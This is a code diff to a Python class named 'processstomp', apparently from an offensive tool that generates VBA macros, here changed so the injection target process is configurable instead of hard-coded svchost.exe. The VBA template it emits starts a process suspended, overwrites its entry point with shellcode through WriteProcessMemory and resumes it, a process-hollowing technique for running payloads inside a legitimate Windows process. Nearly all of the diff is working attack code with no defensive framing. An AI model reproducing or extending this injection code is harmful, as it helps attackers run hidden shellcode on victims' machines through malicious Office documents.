@@ -2,7 +2,9 @@ from string import Template
 
 class processstomp:
     def __init__(self, arguments):
-        pass
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return ['Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long',
@@ -60,7 +62,7 @@ End Type
 """
 
     def template(self) -> str:
-        return """
+        return Template("""
     Dim si As STARTUPINFOA
     RtlZeroMemory si, Len(si)
     si.cb = Len(si)
@@ -68,7 +70,7 @@ End Type
     Dim pi As PROCESS_INFORMATION
     Dim procOutput As LongPtr
     ' Start svchost.exe in a suspended state
-    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
+    procOutput = CreateProcessA(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
     
     Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
     Dim ProcInfo As LongPtr
@@ -132,4 +134,4 @@ End Type
     a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
     ' Resume svchost.exe process to run the shellcode
     b = ResumeThread(pi.hThread)
-"""
+""").substitute(target=self.target)
